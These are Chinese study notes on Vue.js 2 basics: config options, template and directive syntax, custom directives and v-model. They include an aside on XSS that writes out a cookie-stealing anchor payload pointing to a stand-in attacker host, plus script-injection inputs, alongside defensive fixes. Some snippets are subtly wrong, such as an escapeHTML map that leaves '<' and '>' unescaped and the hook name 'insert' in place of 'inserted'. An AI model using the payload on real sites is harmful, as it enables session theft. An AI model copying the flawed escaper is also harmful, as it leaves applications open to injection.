# Vue
vue分为 插件 和 核心库, 核心库比较小, 在这做项目的时候再根据需求下载对应的插件

<br><br>

### 作用: 
动态构建用户界面

<br>

### Vue 是一个渐进式的框架, 什么是渐进式?
你把数据给我 我给你呈现界面  

假如我们的应用很简单 那么我们只需要 引入一个小巧的核心库就可以了 如果我们的应用比较复杂 可以引入各式各样的vue插件 可以满足你各种各样的需求 

- Core(vue 核心)
- vue-router(路由)
- vuex(状态管理)

<br>

### vue 有很多特点和 web 开发中常见的高级功能
- 采用组件化模式 提高代码复用率 且让代码更好维护  
- 声明式编码 让编码人员无需直接操作DOM 提高开发效率 区别于命令式编码
- 使用虚拟DOM + 优秀的Diff算法 尽量服用DOM节点 (虚拟DOM就是内存中的数据)
- 前端路由技术
- 状态管理
- 虚拟 DOM

<br>

### vue-cli: vue 脚手架
帮助我们下载基于vue的项目的 配置声明依赖等

<br><br>

## 案例 : Hello Vuejs
我们来做我们的第一个 Vue 程序, 体验一下 Vue 的响应式

<br>

### 优点:
数据和界面可以完全分离 当数据发生改变的时候, 页面中的数据会自动发生响应(自动修改为新数据)

<br>

### 实现:
首先创建 Vue 的实例对象, 并传递了一个配置对象作为参数
```js
let app = new Vue({ 配置对象 })
```

<br>

### 配置对象中的配置项:
```js
let app = new Vue({
  // element: 选择器 -- vue管理的区域
  el:'id',
  // 数据
  data: { }
})
```

<br>

### 示例:
```html
<div id="app">
  {{message}}
</div>

<script>
  const app = new Vue({
    el:'#app', 
    data: {
      message:'Sam要更加的努力和加油哦'
    }
  })
</script>
```

<br><br>

## 案例: v-model 双向绑定

```html 
<div id="app">
  <input type="text" v-model='username'>
  <h3>hello, {{username}}</h3>
</div>

<script>
  // 创建vue实例
  const app = new Vue({
    el: '#app',
    data: {
      username: 'atguigu'
    }
  })
</script>
```

<br><br>

## 案例: v-for
数据列表, 我们现在从服务器请求过来一个列表, 希望展示到 HTML 中

HTML模板中, 使用 v-for 指令 这种模式是响应式的  
比如我们要往数据里面追加元素的时候, vue 会自己创建新的 li 来更新页面

```html
<div id="app">
  <ul>
    <!-- 
      在这里我们使用v-for来遍历我们传递进来的列表 
      Vue会自动帮我们创建5个li, 每个li中的元素是不一样的
     -->
    <li v-for='item in movies'>{{item}}</li>
  </ul>
</div>

<script>
const app = new Vue({
  el:'#app',
  data: {
    movies:['海王', '星际穿越', '大话西游', '少年派', '盗梦空间']
  }
})
</script>
```

<br><br>

## 案例: 计数器

- 点击 + 计数器+1  
- 点击 - 计数器-1

```html
<div id="app">
  <h3>
    <span>当前计数:{{counter}}</span>
  </h3>
    <button v-on:click='sub'>-</button>
    <button v-on:click='add'>+</button>
</div>

<script>
const app = new Vue({
  el:'#app',
  data:{
    counter:0,
  },
  methods: {
    add:function() {
      this.counter++;
    },

    sub:function() {
      this.counter--;
    }
  }
})
</script>
```

<br><br>

# Vue.js 安装

### CDN引入:
```html
<!-- 开发环境版本 包含了有帮助的命令行警告 -->
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>

<!-- 生产环境版本 优化了尺寸和速度 -->
<script src="https://cdn.jsdelivr.net/npm/vue"></script>
```

<br>

### 下载和引入
```s
# 开发环境
https://vuejs.org/js/vue.js

# 生产环境
https://vuejs.org/js/vue.min.js
```

<br>

### npm 安装
学习到中间项目的时候会用到这种方式下载, 后续通过 webpack 和 cli 的使用

```s
vue -V
```

<br><br>

# MVVM
什么是 MVVM 呢?  **Model-View-ViewModel**

```
v       对应的是html模板
model   对应data中的数据
vm      Vue实例对象
```

MVVM 就是将其中的 View 的状态和行为抽象化 让我们将视图UI 和 业务逻辑分开。  
当有数据需要展示的时候, viewmodel 会自动把数据绑定到 view 上面  
当 view 有事件触发的时候, 我们也是通过 ViewModel 

<br>

### Vue 中的 MVVM
```
              ViewModel

View        DOM Listeners       Model
            Data Bindings

DOM             Vue             Plain JS OBJ
```

<br>

### view: 视图层  
在我们前端开发中, 通常就是 DOM 层, 主要的作用是给用户展示各种信息   
是html中的被vue管理的部分, 比如 ``div id='app'``

<br>

### Model: 数据层  
数据可能是我们固定的死的数据, 但更多的是来自我们服务器, 从网络上请求下来的数据  
我们计数器的案例中, 就是后面抽取出来的 obj, 当然 里面的数据结构可能没有这么简单

是数据对象(data) 数据是给视图用, 自动能读

<br>

### vueModel: 视图模型层 (纽带)
视图模型层是 view 和 model 沟通的桥梁  

一方面它实现了 data binding 也就是数据绑定, 将 model 的改变实时的反应到 view 中  
另一方面它实现了 DOM listener 的监听, 当 dom 发生了一些事件(点击 滚动 touch 等)时, 可以监听到, 并在需要的情况下改变对应的 data

<br><br>

# Vue: 引入JS版
跟jQ的使用方式一样 通过script标签引入Vue文件 引入后全局会多了一个Vue全局对象

<br>

### 注意:
我们在引入 Vue.js 的时候如果是开发版本 控制台会输出警告 如果不希望有警告的话我们可以使用 Vue.config 来进行配置

<br>

**配置方式:**  
Vue.config它是一个对象 包含Vue的全局配置 可以在启动之前修改下列的 property 一次修改全局都用

```js
// 设置为 false 以阻止vue在启动时生成生产提示
Vue.config.productionTip = false
```

<br><br>

## 创建 Vue 实例
容器 和 Vue实例 是一对一的关系

```html
<!-- root容器里的代码被称为 Vue 模板 -->
<div id='root'>
  <h3>hello, {{title}}</h3>
</div>

<script>
Vue.config.productionTip = false

new Vue({
  el:'#root',
  data: {
    title: 'sam'
  }
})
</script>
```

<br>

### **<font color="#C2185B">配置项: el</font>**  
通过该配置项指定Vue管理的实例 值通常为css选择器字符串
```js 
new Vue({
  el:'#root',

  // 也可以使用js代码来获取
  el: document.querySelector('#root')
})
```

<br>

### **<font color="#C2185B">配置项: data</font>** 
data中用于存储数据 数据供el所指定的容器去使用  

<br>

**类型:**  
```s
object | function
```

<br>

**作用:**   
Vue实例对应的数据对象 data中的一组组kv最终都会在vue实例上 也就是在this上 展开组件直接能看到data中的数据

<br>

### 注意:
**在组件当中 data 必须是一个函数**   

<font color='#C2185B'>只有配置在data中的数据 才会做数据代理 和 数据劫持</font>

<br>

data中的数据发生变化 **模板就会重新解析** 用到data中的数据的地方就会被重新执行

一旦data中的数据发生改变 界面里的用到该数据的地方也会发生改变

<br>

### **<font color="#C2185B">配置项: methods</font>**   
配置在这里面的方法要么是回调 要么放在生命周期里面调用

<br>

**传参:**  
html模板中在调用方法的时候可以将数据通过实参的形式传递给 methods 中的方法

<br>

**作用:**   
定义属于 Vue 的一些方法, 可以在其他地方调用, 也可以在指令中使用

<br>

### **<font color="#C2185B">配置项: template</font>**   
我们都是在 ``div#root`` 里面写模板 其实这个区域可以不写任何东西
```html
<div id="root">
  <h3>放大10倍后的值是<span v-big='number'></span></h3>
  <input type="text" v-fbind:value='number'>
</div>


<div id="root"> </div>
```

我们可以传入 template配置项 在里面写 模板的部分 vue在解析的时候会解析template中传入的模板 template的值是一个字符串

<br>

**注意:**  
1. 我们要使用 模板字符串 的形式
2. 多个结构的时候外层要套一个div
3. 使用template配置项的时候 vue在解析模板 挂载模板的时候 **div#root会被template中内容完全替换** 挂载到页面上的

```js 
new Vue({
  el: '#root',
  template: `
    <div>
      <h3>放大10倍后的值是<span v-big='number'></span></h3>
      <input type="text" v-fbind:value='number'>
    </div>
  `
```

<br>

### 扩展: 配置项
```js
export default {
  components: ,
  watch: ,
  computed: ,
  filters: ,
  directives: ,
}
```

<br>



### **el配置项代替案<font color='#C2185B'>$mount()</font>**
我们使用Vue原型对象上的方法 $mount 来挂载容器
```js 
let vm = new Vue({
  data: {
    name: 'sam'
  }
})
vm.$mount('#root')

// 或者
new Vue({}).$mount('#root')
```

<br>

### **<font color="#C2185B">配置项: data对象函数</font>**   
上面我们一直使用的data对象式写法 它也可以写成函数式 

函数内部必须 ``return {}`` 数据在return的对象中进行定义

```js 
// 对象式:
data: {}

// 函数式:
data() {
  return {
    name: 'sam'
  }
}
```

<br>

**函数式的dataVue帮我们调用的**, 该函数的this是Vue实例对象 一般在对象中写函数都会写成es6简写方式

<br>

### 注意:
函数式的data, 不能使用 箭头函数的方式 this的指向会变成window   

**由Vue管理的函数一定不要写箭头函数** 一旦写了箭头函数 this就不再是Vue实例而是window

<br><br>

# 模板语法
插值的相关操作都是把变量放入文本中显示 

所有写表达式的地方, vm身上的所有东西都可以看到拿来直接调用

模板中的 ``{{ }}`` 中可以直接使用vm身上的属性和方法不用加this 同时模板中出现的属性和方法按着原型链会去vm上查找 

<br>

### 技巧: 模式中使用 window 上的属性 和 方法
```js 
{{ alert }}   // 就会报错vm身上没有alert方法

// 解决办法
data: {
  window: window
}

{{winodw.alert}}


<li>{{console.log(count)}}</li>   // 报错

// 解决办法
data() {
  return { window: window }
}

<li>{{winodw.console.log(count)}}</li>
```

<br>

### **<font color="#C2185B">胡须语法: {{ js表达式 }}</font>**  
在 Mustache 语法中 不仅仅可以直接写变量, 也可以写简单的表达式 往往用于处理标签体内容

```html
<h2>{{message}}</h2>
<h2>{{message}}, 我是文本</h2>

<!-- kobebryant -->
<h2>{{firstName + lastName}}</h2> 

<!-- kobe bryant -->
<h2>{{firstName +' '+ lastName}}</h2>

<h2>{{firstName}} {{lastName}}</h2>

<!-- 直接显示 -->
<h2>{{counter}}</h2>

<!-- 显示counter的2倍 -->
<h2>{{counter*2}}</h2>

<script>
  data: {
    message:'你好啊',
    firstName:'kobe',
    lastName: 'bryant',
    counter:100
  }
</script>
```

<br><br>

# 指令语法
往往用于解析标签属性(包括 标签属性 标签体内容 绑定事件)  
指令语法一般定义在标签的属性里面

<br>

### **<font color="#C2185B">v-once</font>**  
该指令后面不需要跟任何表达式  

该指令表示元素和组件只会渲染一次, 不会随着数据的改变而改变(不会因为改变 data 里面的数据, 响应到 dom 中)

<br>

**应用场景:**  
在某些情况下, 我们可能不希望界面随意的跟随改变, 这个时候我们就可以使用这个指令

v-once所在节点在初次动态渲染后 就视为静态内容了 以后数据的改变不会引起v-once所在结构的更新 可以用于优化性能
```js
<h2 v-once>{{message}}</h2>
// 后续修改message里面的值 页面中显示的还是第一次的值
```

<br>

### **<font color="#C2185B">v-html</font>**  
渲染文本到标签体中 如果文本中含有标签的时候 v-html 会对标签进行解析

该指令后面往往会跟上一个 string 类型, 会将 string 的 html 解析出来并且进行渲染
```js
// 结果: 标题类型的hello
<h2 v-html='message'></h2>    

data: {
  message:'<h1>hello</h1>',
}
```

<br><br>

## 扩展: xss攻击
v-html有安全性的问题 在网站上动态渲染任意html是非常危险的 容易导致xss攻击  

**一定要在可信的内容上使用v-html 永远不要用在用户提交的内容上**

<br>

### 先铺垫两个知识点:  
- **<font color="#C2185B">document.cookie</font>**  
可以拿到当前网站上所有的cookie

<br>

- **<font color="#C2185B">``<a href=javascript:location.href="坏人准备干坏事的网站" />`` </font>**  
a标签内容还可以这么写代码

<br>

### 什么是xss攻击?
我们在登录一个网站的时候 如果成功登录后 目标服务器会返回给客户端cookie存储在用户的浏览器里面

每一个网站发送过来的cookie都是以网站为单位存储的 该cookie就相当于用户在目标网站的身份证 有了cookie甚至可以免登录

假如我们弄丢了cookie 被别人拿到 那么这个人就可以导入我们的cookie伪装成我们免密登录目标网站

<br>

### 作案场景:
比如 百度贴吧 我们用户可以发送留言 发送的留言都会保存在数据库中 然后程序员拿到数据后通过遍历 动态的渲染到页面结构里

假如 有坏人 以下面的方式 留言
```html
<a href=javascript:location.href="http://www.huairen.com?document.cookie">有妞</a>
```

该段代码意思是 带着当前正在浏览上的所有cookie访问坏人的服务器并将cookie传递给坏人的服务器

假如我们程序员 整好 使用v-html来根据留言数据 渲染页面就会造成 这段代码被解析成一个标签 如果有人点击后 后果不堪设想

<br>

### XSS的类型:
**反射型:**  
一般需要攻击者事先制作好攻击链接 然后诱骗用户自己点击链接才会触发xss代码

服务器中并没有这样的页面和内容 一般都存在于搜索页面中 特点是非持久性

<br>

**存储型:**
代码是存储在服务器数据库中的 如在个人信息或发表评论的地方 如果对于用户输入的内容没有过滤或过滤不严格 

那么这些代码将存储到服务器中每当有用户访问该页面的时候都会触发代码执行 这种xss非常的危险 容易造成蠕虫 大量盗窃cookie 

虽然还有DOM型XSS 但是也还是包括在存储型里面 特点是持久性

<br>

### XSS示例1:

**反射型:**  
```html
<input type="text" :v-model="msg"> 搜索

<h3>{{msg}}</h3>
```

我们在输入框内 填写如下代码 格式为: 
```html
</h3> <script>alert(1)</script> <h3>
```

相当于我们往代码里面又插入了一段代码

<br>

### 解决方案
当然cookie也有验证 需要在后端设置 给敏感数据 比如cookie设置 HttpOnly 这样只有浏览器才能读取cookie并携带cookie其它人都不可以

使用 ``document.cookie`` 也不能读取 cookie, cookie为空

<br>

前端人员除了传统的 XSS、CSRF 等安全问题之外 又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。

<br>

### 请判断以下两个说法是否正确:
- XSS 防范是后端 RD(研发人员)的责任 后端RD <font color="#C2185B">应该在所有用户提交数据的接口 对敏感字符进行转义</font> 才能进行下一步操作。

- 所有要插入到页面上的数据 都要通过一个敏感字符过滤函数的转义 过滤掉通用的敏感字符后 就可以插入到页面中。

<br>

### XSS示例2:
公司需要一个搜索页面 根据 URL 参数决定关键词的内容。

```jsp
<input type="text" value="<%= getParameter('keyword') %>">

<button>搜索</button>
<div>
  您搜索的关键词是<%= getParameter("keyword") %>
</div>
```

然而 在上线后不久 小明就接到了安全组发来的一个神秘链接:   
```s
http://xxx/search?keyword="><script>alert('XSS');</script>
```

小明带着一种不祥的预感点开了这个链接 [请勿模仿 确认安全的链接才能点开]。果然 页面中弹出了写着"XSS"的对话框。

当浏览器请求 ``http://xxx/search?keyword="><script>alert('XSS');</script>`` 时 

服务端会解析出请求参数 keyword 得到``><script>alert('XSS');</script>`` 拼接到 HTML 中返回给浏览器。形成了如下的 HTML: 

```html
<input type="text" value=""><script>alert('XSS');</script>">
<button>搜索</button>
<div>
  您搜索的关键词是: "><script>alert('XSS');</script>
</div>
```

浏览器无法分辨出 <script>alert('XSS');</script> 是恶意代码 因而将其执行。

这里不仅仅 div 的内容被注入了 而且 input 的 value 属性也被注入 alert 会弹出两次。

其实 这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。 聪明的小明很快找到解决方法 把这个漏洞修复: 

```html
<input type="text" value="<%= escapeHTML(getParameter("keyword")) %>">
<button>搜索</button>
<div>
  您搜索的关键词是<%= escapeHTML(getParameter("keyword")) %>
</div>
```

<br>


### **<font color='#C2185B'>扩展: escapeHTML()</font>**
一个用于转义 HTML 字符的方法, 它将 HTML 字符中的特殊字符转换为它们的对应实体编码, 这样可以避免这些字符被浏览器解释为 HTML 标签或特殊字符 而是作为普通文本显示

<br>

浏览器并没有给我们提供 escapeHTML 方法 但是我们要实现对文本进行转义的话 可以使用如下的两种方法

<br>

**方式1: 自定义 escapeHTML 方法**
```js
function escapeHTML(html) {
  var escapeMap = {
    '&': '&amp;',
    '<': '<',
    '>': '>',
    '"': '&quot;',
    "'": '&#39;',
    "/": "&#x2F;"
  };
  
  return html.replace(/[&<>"']/g, function(match) {
    return escapeMap[match];
  });
}

var originalHTML = '<script>alert("Hello!");</script>';
var escapedHTML = escapeHTML(originalHTML);

console.log(escapedHTML);
```

<br>

**方式2: 利用dom文本节点的api**  
1. 根据 字符 创建 文本节点
2. 将文本节点插入到 div 中
3. 返回的 div.innerHTML

```js
const html = "<p>This is</p>"
const textNode = document.createTextNode(html)

const div = document.createElement("div")
div.appendChild(textNode)

// div.innerHTML 就是转义过的内容 浏览器会自动对其中的特殊字符进行转义
console.log(div.innerHTML)
```

<br>
 
```s
https://tech.meituan.com/2018/09/27/fe-security.html
```

<br><br>

### **<font color="#C2185B">v-text</font>**
向其所在的标签插入文本  

如果 v-text 对应的值里有标签体类型的文本 它不会解析成标签 只是当字符串来解析
```js 
<h2 v-text='message'></h2>
// 结果:  <div>hello</div>

data: {
  message:'<div>hello</div>',
}
```

<br>

v-text 作用和 Mustache 比较相似, 都是用于将数据显示在界面中  

v-text 通常情况下, 接收一个 string 类型 但是该方法不够灵活 **它会拿到message的值覆盖掉标签中所有的标签体**
```js
<h2>{{message}}</h2>
<h2 v-text='message'></h2>      // 结果一样

data: {
  message:'你好啊',
}


// 不够灵活
<h2>{{message}}, sam</h2>           
// 你好啊, sam

<h2 v-text='message'>, sam</h2>     
// 只有你好啊 会覆盖掉 (, sam)
```

<br>

### **<font color="#C2185B">v-pre</font>**
v-pre 用于跳过这个元素 和 它子元素的编译过程 可以利用它跳过 没有使用插值语法的节点 会加快编译

一般我们都会给 没有vue语法的节点加v-pre 这样vue就不用分析该节点了 跳过了编译过程

``<pre></pre>``的效果相似 在该标签里面的内容会原封不动的给你展示出来
```js
<h2>{{message}}</h2>            // 你好啊
<h2 v-pre>{{message}}</h2>      // {{message}}

data: {
  message:'你好啊',
}
```

<br>

### **<font color="#C2185B">v-cloak</font>**

**使用方式:**  
1. 在目标标签里面 使用 v-cloak, v-cloak 会在vue接管的一瞬间被删掉  

2. 配置css样式 
```js 
[v-cloak] {
  display:none;
}
```

<br>

**应用场景:**  
当网速过慢的时候 不让未经解析的模板跑到页面上去 该方法需要 v-cloak 配合 css 来使用

js阻塞 js基础的时候我们就了解过js阻塞的概念
```
js    这里我要是加载一个js文件 要花费 5s 的时间
html  这里就会等待5s后才会渲染出结果
```

上面的这种情况下页面就会出现短暂的空白时间


那假如是下面的情况
```js 
html   {{name}}
// js     这里我要是加载一个js文件 要花费 5s 的时间
// vue    这里就会等待5s后 vue才能功能 接管上面的html部分
```

上面的这种情况 页面会 展示 {{name}} 近5秒的时间 为了解决这个问题 我们可以在标签内部加上v-cloak这个属性

```js 
// CSS部分:
[v-cloak] {
  display:none;
}


// HTML部分:
<div id="app">
  <h2 v-cloak>{{message}}</h2>
</div>


// JS部分:
const app = new Vue({
  el:'#app',
  data: {
    message:'你好啊',
  }
})
```

<br><br>

## 自定义指令: directives配置项
上面介绍的都是vue帮我们写好的指令我们都是直接拿过来使用的 也就是内置指令  

内置指令的背后也是在用操作dom的方式 也就是说 **自定义指令是对原生操作dom的方式进行的封装**

<br>

### 要点:
- 自定义属性是通过 el 操作dom节点的一系列操作
- 自定义属性也是响应式的 绑定的数据发生变化 页面也会跟着发生变化

<br>

### 需求:
- 定义一个 v-big指令 效果和v-text类似 但可以把绑定的数值放大10倍
- 定义一个 v-fbind指令 效果和v-bind类似 但可以让其所绑定的input元素默认获取焦点

<br>

### directives 配置项
**所谓的自定义指令就是一个函数 由vue帮我们调用**

在标签属性内部使用 ``<div v-big="数据">`` 传入的数据 会经过 v-big 自定义指令里面的逻辑处理后 展示到 标签体中

<br>

1. 标签属性中写 自定义指令 v-big
2. 在 directives 配置项中写 big 指定指令
  - big: { ... }
  - big() { ... }

```js
{
  directives: { big: { } },   // 对象式
  directives: { big() { } }   // 函数式
}
```

<br>

**对象式写法:**  
优势在于可以处理细节上的东西

```html
<h3>放大10倍后的值是<span v-big='number'></span></h3>

<script>
data() {
  return {
    number: 50
  } 
},


directives: {
  // 对象式
  big: {
    // 当指令与元素成功绑定的时该函数会被调用
    bind(el, binding) {}       

    // 指令所在元素被插入页面时该函数会被调用
    inserted(el, binding) {}   

    // 指令在的模板被重新解析时该函数会被调用
    update(el, binding) {}     

    // 指令所在组件的 VNode 及其子 VNode 全部更新后调用。
    componentUpdated(el, binding) {}

    // 只调用一次 指令与元素解绑时调用。
    unbind() {}
  }, 

  // 函数式
  big(element binding) { }
}
</script>
```

<br>

### 注意:
**自定义属性传递进来的数据 必须是在组件身上定义过的** 

比如必须在data身上配置过 因为它也要保证自定义属性 数据的响应式

也就是说我们传入自定义属性中的数据 要想具有响应式则该数据必须在data中定义

<br>

### 自定义指令: 函数式写法
```js
{
  data() {
    return {
      number: 50
    } 
  },
  directives: {
    big(element, binding) { }
  }
}
```

```html
<span v-big='number'></span>
```

<br>

**参数:**  
- element: 当前v-big所在的真实DOM  ``<span></span>`` 也就是DOM节点

- binding: v-big 所绑定的标签对象 内部有很多的属性
```js
// 该数据必须在data中配置
binding.value -> 使用 v-big="数据" 时传递进来的数据
```

<br>
  
### 实现需求1:
当使用v-big指令的时候 同v-text使用方式一样 将结果x10放到标签体中
```js 
export default {
  name: "Test",
  data() {
    return {
      num: 20
    }
  },
  directives: {
    big(el, bind) {
      // 这里也是使用 原生js的方式 写的逻辑
      el.innerHTML = bind.value * 10
    }
  },
}
```

<br>

### 自定义指令 函数式的调用时机
1. 指令与元素成功绑定的时候 **初始的时候**
2. 自定义指令函数中所依赖的数据发生变化的时候 该函数会被重新调用   
**更加准确的说法是 指令所在的模板重新解析的时候 该函数都会被重新调用**

<br>

### 自定义指令: 对象式写法
```html
<span v-fbind='number'></span>
```

对象式的方式具有像生命周期式的性质 **在下面的3种情况下会被触发**

1. 指令和元素成功绑定
2. 已绑定指令的元素被 挂载 到页面 **好像mounted**
3. 已绑定指令的元素 模版被重新解析 **好像updated**

我们先把函数准备好 vue会在对应的时机调用对应的函数 **下面的函数都能收到 element 和 binding 参数**

```js
directives: {

  自定义指令: {
    // 当指令与元素成功绑定的时该函数会被调用
    bind(el, binding, vnode) {}       

    // 指令所在元素被插入页面时该函数会被调用
    inserted(el, binding, vnode) {}   

    // 指令在的模板被重新解析时该函数会被调用
    update(el, binding, vnode) {}     

    // 指令所在组件的 VNode 及其 子VNode 全部更新后调用, 或者说 在指令绑定的元素及其子组件更新后被调用
    componentUpdated(el, binding, vnode, oldVnode) {}

    // 只调用一次 指令与元素解绑时调用。
    unbind() {}     
  }
}
```

<br>

很多情况下 bind函数中的逻辑 和 update函数的逻辑是一样的  

如果我们使用的简写形式 相当于我们使用了bind 和 update 没有使用inserted

<br>

**inserted里面一般是做真实能够操作dom元素的逻辑** 比如获取它的父节点等 因为**这个时间点元素已经被挂载到页面上**了

<br>

### 实现需求2:
定义一个 v-fbind指令 效果和v-bind类似 但可以让其所绑定的input元素默认获取焦点

```html
<input type="text" :value='number'>
```

<br>

**函数式的方式所产生的问题:**
错误演示
```js
directives: {
  fbind(el, binding) {

    // 将输入框的值 修改为 指定绑定的data中变量所对应的值
    el.value = binding.value

    // 自动获取焦点
    el.focus()
  }
}
```

上面我们获取了 v-fbind 传递的值 赋值给了 el 上 然后期望它能获取焦点 但是我们发现 el.focus() 之后 input并没有获取到焦点 

代码肯定是奏效了 只能说明 执行的时机不对 那 fbind 这个函数是什么时候调用的?   
1. 该指令和元素绑定在一起的时候
2. 该指令处于的模板被重新解析的时候

我们的问题就在问题1 fbind函数会在 指令和元素绑定的时候 这时候仅仅是在内存里面建立了 绑定关系 并没有跑到页面上 

而我们 el.focus() 还在内存中就开始被调用 也就是说在元素挂载到页面之前就执行了 focus() 逻辑 所以是不奏效的

也就是说 el.focus() 这部分的逻辑 要在另一个时机调用

<br>

将上面的函数式的写法 修改为 对象式的写法, 像不像在一个自定义指令中写了3个生命周期函数
```js
directives: {
  fbind: {
    bind(el, binding) {
      el.value = binding.value
    },

    insert(el, binding) {
      el.focus()
    },

    // 注意 我们要写update 要不vue不知道我们更新的时候要干什么
    update() {
      el.value = binding.value
    }
  }
}
```

<br>

### 注意:
自定义指令的名字 不要使用驼峰命名法 多个单词之间使用-来连接 同时 变量名里面如果使用了 - 我们就要使用引号将它括起来
```js 
// v-big-number
'big-number'() { ... }
```

<br>

### 自定义指令中的this:
自定义指令的函数中的this(也就是directives里面配置的函数中的this)都是**window**

我打印了一下 自定义指令中的所有回调中的 this 都是 undefined

<br>

**获取this: vnode.context**
```js
bind(el, bind, vnode) {
  // 组件实例
  console.log(vnode.context)
},
```

<br>

### 全局配置: 自定义指令
### **<font color='#C2185B'>Vue.directive('指令名', {指令的配置对象})</font>**
```js
Vue.directive('fbind', {
  
  bind(el, binding, vnode) { 
    el.value = binding.value
  },

  insert(el, binding, vnode) {
    el.focus()
  },
  
  update(el, binding, vnode) {
    el.value = binding.value
  }

})
```

<br>

### 技巧: 场景描述
我们在项目中 会使用 v-html 来渲染包含标签的字符串
```html
文字文字<a href>こちら</a>文字文字
```

但是v-html会将字符串解析成 纯html 也就是说 我们要是使用 ``<NuxtLink>`` -> 解析后 ``<nuxtlink>こちら</nuxtlink>``

也就浏览器并不认识的``<NuxtLink>`` 那怎么才能实现 ``<NuxtLink>`` 的功能呢? 

<br>

**思路: 利用编程式导航 api**  
获取 ``<a>`` 的href的属性值 通过 router.push 导航式API 去进行跳转

<br>

**步骤:**  
- 我们 **bind()** 方法中 也就是 v-指令 与节点 绑定在一起的时候 获取 该元素下的所有 a标签(href的值是以 "/" 开头的) 然后 给它们遍历 绑定 click 事件

- 在 **unbind()** 方法中 解绑 click 事件

- 在 父子组件重新渲染后 依次调用 unbind() 和 bind() 确保先解绑事件后再绑定事件

- click的事件回调中的逻辑是: 看注释部分

<br>

**代码:**  
```js
// plugins/v-content-links.js
import Vue from 'vue'

export default ({ app }) => {
  const pushRoute = ev => {
    // 获取 href 值
    const href = ev.currentTarget.getAttribute('href')

    if (!href || href[0] !== '/') return

    // 通过 resolved.matched 属性可以判断我们传入的 href 是否有对应的注册的路由
    const { resolved } = app.router.resolve(href)

    // マッチするルートがあり、パス部分にトレイリングスラッシュがあるなら router.push で遷移する
    // 如果我们传入的路径后面是以 / 结尾的话 取消a的默认行为 通过编程式路由导航的方式跳转页面
    if (resolved.matched.length && resolved.path.slice(-1) === '/') {
      ev.preventDefault()
      
      // resolved 自体を渡したいがトレイリングスラッシュが消えてしまう
      app.router.push(resolved.fullPath)
    }
  }

  const bind = function(el) {
    const internalLinks = el.querySelectorAll('a[href^="/"]')
    for (let i = internalLinks.length; i--;) internalLinks[i].addEventListener('click', pushRoute, false)
  }
  const unbind = function(el) {
    const links = el.getElementsByTagName('a')
    for (let i = links.length; i--;) links[i].removeEventListener('click', pushRoute, false)
  }

  Vue.directive('content-links', {
    bind,
    unbind,
    componentUpdated(el) {
      unbind(el)
      bind(el)
    },
  })
}


// nuxt.config.js
export default {
  plugins: [
    '~/plugins/v-content-links',
  ],
}


<div v-html="post.content" v-content-links />
```

<br>

**参考链接:**  
```s
https://jamblog-beryl.vercel.app/internal-links/
```

<br>

**Vue中的实现方式:**
```html
<script>
// 导入了 router
import router from "../router/"

export default {
  name: "App",
  data() {
    return {
      content: "<router-link>内容</router-link>"
    }
  },
  directives: {
    "custome-link": {
      bind(el, binding) {
        let uri = el.href 
          ? new URL(el.href).pathname 
          : ""
        
        console.log(uri)

        el.addEventListener("click", function(e) {
          e.preventDefault()

          // 这个位置有问题 
          let router = binding.value
          router.push(uri)
        })
      }
    }
  },

}
</script>
```

<br><br>

here
# 表单数据的 双向绑定 v-model
v-model主要是用来捕获(收集)用户的输入 动态收集到 data 中 也就是说数据不仅能从data流向页面 还可以从页面流向data

<br>

在原生的js中当我们要收集表单数据的时候
1. 要么使用js挨个获取
2. 要么使用formData表单对象来获取

<br>

在vue中可以很便利的通过 v-model 指令来收集用户在表单上输入的数据

<br>

### 常用的表单类的元素
- input
- radio 
- checkbox
- select
- textarea

这些表单类元素都有一个特殊的值 value 我们 v-model 通常都是绑定在value上的, 因为 v-model **默认收集的就是value的值**
```js
v-model:value='data中的变量' 

// 简写:

v-model='data中的变量'
```

<br><br>

## input: v-model
v-model只能应用在表单类元素上(输入类元素)上 一般都会绑定value

```html
<input type="text" v-model:value='title'>

<!-- 简写形式 -->
<input type="text" v-model='title'>
```

将用户在这个表单项上的输入 收集到data配置项中的title变量中

<br>

### 语法:
```html
<input v-model='data中的变量' />
```

<br>

### 要点:
v-model在给变量赋值的时候赋值的类型都是 string 类型

<br>

### v-model 原理:
v-model其实是一个语法糖, 它的背后本质上是包含两个操作
1. v-bind绑定一个value属性
2. v-on指令给当前元素绑定input事件

```
源码中, v-model 会判断标签的类型 不同的 input类型 对应使用的事件也不一样
```

```html
<input type="text" v-model='message'>

<!-- 等同于 -->

<input 
  type="text" 
  :value='message' 
  v-on:input='message == $event.target.value'
>
```

<br>

### 具体操作:
**1. 首先使用 :value 将 message 和 input的value 绑定到一起**
```html
<input type='text' v-bind:value='message'>
```

**2. 接下来我们修改data中的message**   
我们会实时获取到input中的value的值 赋值给message

实时监听input标签 我们要用到 oninput事件 input当中的value的值, 我们通过 ``$event.target.value`` 来获取

<br>

input元素上有一个事件叫 input 用于实时动态监听用户输入的东西 <font color="#C2185B">不用等到失去焦点就会触发</font>  

接下来我们要将用户输入的东西实时的赋值给message 我们要动态的获取input中的value的值

这个value要通过event来获取, 一旦在我们的界面上产生事件之后浏览器就会生成一个event对象, 这个event对象就包含了我们想要的信息

```html
<input 
  type="text" 
  :value='message' 
  v-on:input='valueChange'
/>

<script> 
  // 我们再methods中定义方法
  methods: {
    valueChange(event) {
      this.message = event.target.value;
    }
  }
</script> 
```

<br>

### 注意: v-model 和 props
**不要使用v-model绑定props属性**  

因为props属性是只读的 子组件修改父组件通过props传递过来的对象中的属性的时候 

会影响到父组件中的值 也就是说 修改子组件中的数据 会同步到父组件身上

当我们在子组件中使用v-model绑定的是一个基本数据类型的数据时 当修改的时候会报错

当我们再子组件中使用v-model绑定的是一个对象中的属性的时候 不会报错 但修改的同时 

子组件和父组件中使用这个属性的地方都会发生变化

<br>

**vue只能浅层次的监视属性改变没有** 不能深度监视 

当props是一个对象的时候 我们只用v-model绑定props对象里面的一个值 vue是发现不了 但日后可能会出现种种的问题

<br>

### 扩展: FTD的使用场景
在FTD的项目就会发生这样的现象 中川的目标是在外壳组件中请求数据 将数据通过prop的方式传递到子组件中

在子组件中 使用 数据判断 或 双向绑定 或 将最后的form拿去当发送请求所需要的数据对象 

事实上也不建议这样做 但是中川做的就没问题么? 
```js
v-model="form[n.props]"
```
```
父组件将请求的数据后的数据对象
  ↘
  通过props传入子组件
        ↘
        子组件使用v-model绑定这个数据对象
              ↘
              子组件拿着这个数据对象去渲染表单的默认值和发送请求
```

